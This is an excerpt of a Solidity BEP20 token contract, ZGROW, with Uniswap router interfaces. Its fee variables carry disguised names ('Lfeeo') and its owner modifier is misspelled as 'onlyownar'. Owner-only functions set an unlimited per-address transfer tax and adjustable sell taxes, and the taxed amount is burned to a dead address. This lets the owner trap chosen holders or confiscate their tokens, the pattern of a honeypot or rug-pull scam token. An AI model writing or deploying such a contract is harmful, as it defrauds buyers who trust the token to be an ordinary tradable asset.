...
interface IUniswapV2Factory {
    ...
    function LfeeoTo() external view returns (address);
    function LfeeoToSetter() external view returns (address);
    ...
    function setLfeeoTo(address) external;
    function setLfeeoToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLfeeoOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLfeeoOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingLfeeoOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLfeeoOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLfeeoOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ZGROW is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellLfeeo = 0;

    uint256 private _defaultBuyLfeeo = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipLfeeo;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellLfeeo = _value;
    }

    function setSlipLfeeo(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipLfeeo[_address] = _value;
    }

    function getSlipLfeeo(address _address) external view onlyownar returns (uint256) {
        return _slipLfeeo[_address];
    }


    function setMAccountLfeeo(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountLfeeo(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLfeeoAmount = 0;

        if (rF) {
            uint256 tradeLfeeo = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeLfeeo = _defaultSellLfeeo;
                }
                if (from == uniswapV2Pair) {

                    tradeLfeeo = _defaultBuyLfeeo;
                }
            }
            if (_slipLfeeo[from] > 0) {
                tradeLfeeo = _slipLfeeo[from];
            }

            tradeLfeeoAmount = _Amount.mul(tradeLfeeo).div(100);
        }


        if (tradeLfeeoAmount > 0) {
            _balances[from] = _balances[from].sub(tradeLfeeoAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeLfeeoAmount);
            emit Transfer(from, _deadAddress, tradeLfeeoAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeLfeeoAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeLfeeoAmount);
        emit Transfer(from, _to, _Amount - tradeLfeeoAmount);
    }
